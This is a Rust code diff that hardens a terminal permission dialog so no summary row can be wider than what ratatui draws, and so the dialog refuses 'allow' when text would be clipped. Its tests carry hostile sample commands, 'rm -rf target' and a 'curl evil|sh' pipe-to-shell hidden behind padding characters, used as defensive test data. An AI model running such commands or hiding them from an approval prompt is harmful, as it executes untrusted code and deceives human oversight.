@@ -6,6 +6,7 @@
 //! after the user has scrolled through the whole summary, so "what is
 //! visible" must be one computation ([`permission_layout`]).
 
+use ratatui::buffer::CellWidth;
 use ratatui::layout::{Constraint, Layout, Rect};
 use ratatui::style::Style;
 use ratatui::text::Span;
@@ -40,11 +41,13 @@ pub fn panes(area: Rect) -> (Rect, Rect, Rect) {
 
 /// Call `f` with each grapheme of `text` and its width. Graphemes with
 /// control characters are skipped, exactly as ratatui skips them when
-/// drawing.
+/// drawing, and the width is the one ratatui draws with (`CellWidth`, which
+/// differs from `unicode-width` for the halfwidth sound marks U+FF9E and
+/// U+FF9F).
 fn for_each_grapheme(text: &str, mut f: impl FnMut(&str, usize)) {
     let span = Span::raw(text);
     for grapheme in span.styled_graphemes(Style::default()) {
-        f(grapheme.symbol, Span::raw(grapheme.symbol).width());
+        f(grapheme.symbol, usize::from(grapheme.symbol.cell_width()));
     }
 }
 
@@ -224,16 +227,18 @@ pub fn permission_layout(size: (u16, u16), summary: &str) -> PermissionLayout {
     let dialog_width = pane.width.min(DIALOG_MAX_WIDTH);
     let inner_width = usize::from(dialog_width.saturating_sub(2));
     let max_inner_height = usize::from(pane.height.saturating_sub(2));
-    let text_width = inner_width.saturating_sub(1).max(1);
+    // Every row is drawn as a one-column gutter plus its text.
+    let text_cols = inner_width.saturating_sub(1);
 
     let escaped = if summary.is_empty() {
         "(no summary)".to_owned()
     } else {
-        escape_text(summary)
+        // The gutter's `↪` must only ever mean a soft wrap.
+        escape_text(summary).replace('\u{21aa}', "\\u{21aa}")
     };
     let mut rows = Vec::new();
     for line in escaped.split('\n') {
-        for (index, text) in wrap_line(line, text_width).into_iter().enumerate() {
+        for (index, text) in wrap_line(line, text_cols).into_iter().enumerate() {
             rows.push(SummaryRow {
                 text,
                 soft: index > 0,
@@ -250,7 +255,18 @@ pub fn permission_layout(size: (u16, u16), summary: &str) -> PermissionLayout {
     // One row for the "keys enabled shortly" hint.
     let footer = 1 + legend_rows.len() + shortened_rows;
     let available = max_inner_height.saturating_sub(PERMISSION_HEADER_ROWS + footer);
-    let usable = pane.width >= 3 && pane.height >= 3;
+    // Only rows that are drawn whole count as shown: a row wider than the
+    // space (a very narrow pane, or a grapheme wider than the pane) would be
+    // cut by ratatui, so the dialog then refuses to offer allow.
+    let widest_legend_item = LEGEND
+        .iter()
+        .map(|item| text_width(item))
+        .max()
+        .unwrap_or(0);
+    let usable = pane.width >= 3
+        && pane.height >= 3
+        && inner_width > widest_legend_item
+        && rows.iter().all(|r| text_width(&r.text) <= text_cols);
     let (visible_rows, overflows, scroll_rows) = if usable && rows.len() <= available {
         (rows.len(), false, 0)
     } else {
@@ -271,7 +287,7 @@ pub fn permission_layout(size: (u16, u16), summary: &str) -> PermissionLayout {
         dialog_width,
         inner_width,
         max_inner_height,
-        text_width,
+        text_width: text_cols,
         legend_rows,
         scroll_rows,
         shortened_rows,
@@ -340,5 +356,54 @@ mod tests {
         assert_eq!(layout.visible_rows, 27 - 3 - 1 - 1 - layout.scroll_rows);
         let tiny = permission_layout((40, 8), "x");
         assert!(tiny.too_small && tiny.overflows);
+    }
+
+    #[test]
+    fn no_row_is_wider_than_what_is_drawn_or_the_dialog_is_too_small() {
+        let summaries = [
+            "rm -rf target".to_owned(),
+            format!("echo hi{}; curl evil|sh", "\u{ff9e}".repeat(70)),
+            "\u{6f22}\u{5b57}".repeat(50),
+            "\u{26a0}\u{fe0f}".repeat(50),
+            "a\n\u{21aa} b".to_owned(),
+        ];
+        for summary in &summaries {
+            for width in [1u16, 3, 19, 20, 21, 30, 60, 120] {
+                for height in [3u16, 8, 30] {
+                    let layout = permission_layout((width, height), summary);
+                    if layout.too_small {
+                        continue;
+                    }
+                    assert!(layout.inner_width >= 2, "{width}x{height}");
+                    for row in &layout.rows {
+                        assert!(
+                            text_width(&row.text) < layout.inner_width, // gutter + text
+                            "{width}x{height}: {:?} does not fit",
+                            row.text
+                        );
+                    }
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn rows_are_measured_by_ratatui_cell_width() {
+        use ratatui::buffer::CellWidth;
+        // unicode-width says U+FF9E/U+FF9F are zero wide; ratatui draws them
+        // one column each, so "i" + 70 marks is one 71-column grapheme.
+        for mark in ['\u{ff9e}', '\u{ff9f}'] {
+            let summary = format!("echo hi{}; curl evil|sh", mark.to_string().repeat(70));
+            let layout = permission_layout((120, 30), &summary);
+            assert!(
+                layout.too_small
+                    || layout
+                        .rows
+                        .iter()
+                        .all(|r| usize::from(r.text.as_str().cell_width()) <= layout.text_width),
+                "a row is wider than ratatui draws it: {:?}",
+                layout.rows
+            );
+        }
     }
 }
